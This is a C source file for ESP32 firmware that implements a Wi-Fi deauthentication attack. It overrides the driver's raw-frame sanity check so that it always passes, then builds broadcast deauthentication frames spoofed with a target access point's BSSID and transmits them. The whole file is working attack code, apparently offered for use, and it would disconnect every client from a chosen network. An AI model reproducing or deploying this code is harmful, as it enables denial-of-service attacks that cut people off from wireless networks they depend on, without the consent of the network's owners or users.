/**
 * @file wsl_bypasser.c
 * @author TaxCoding (raja.naufal1605@student.unri.ac.id)
 * @date 2026
 * @copyright Copyright (c) 2026
 * 
 * @brief Implementation of raw 802.11 frame injection and sanity check override for deauthentication attacks.
 */

#include "wsl_bypasser.h"
#include <stdint.h>
#include <string.h>
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";

static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Linker-level override function to bypass internal Wi-Fi driver sanity checks.
 * 
 * @param arg Parameter 1.
 * @param arg2 Parameter 2.
 * @param arg3 Parameter 3.
 * @return int Always returns 0 to allow raw frame injection.
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

/**
 * @brief Transmit a raw 802.11 frame via the Wi-Fi AP interface.
 * 
 * @param frame_buffer Pointer to the raw frame byte array.
 * @param size Size of the frame buffer in bytes.
 */
void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

/**
 * @brief Construct and transmit an IEEE 802.11 deauthentication frame targeting a specific AP record.
 * 
 * @param ap_record Pointer to the target wifi_ap_record_t structure.
 */
void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}